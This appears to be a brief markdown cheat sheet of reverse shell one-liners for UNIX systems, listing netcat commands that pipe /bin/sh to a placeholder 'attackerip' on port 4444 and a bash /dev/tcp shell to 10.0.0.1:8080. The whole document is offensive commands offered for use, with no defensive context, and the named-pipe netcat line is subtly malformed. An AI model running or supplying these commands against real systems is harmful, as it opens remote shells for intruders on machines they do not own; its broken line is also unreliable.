## Reverse Shell One-liners
These are a list of shell one liners which be invoked on most of UNIX systems

### 1. Netcat

For old versions of netcat -
> nc attackerip 4444  -e /bin/sh
> /bin/sh | nc attackerip 4444  

This should work on most modern implementation of nc
> rm -f /tmp/p; mknod /tmp/p p && nc attackerip 4444 0/tmp/p  

If you require to use old versions of netcat you can do so by 
> sudo apt-get install netcat-traditional



bash -i >& /dev/tcp/10.0.0.1/8080 0>&1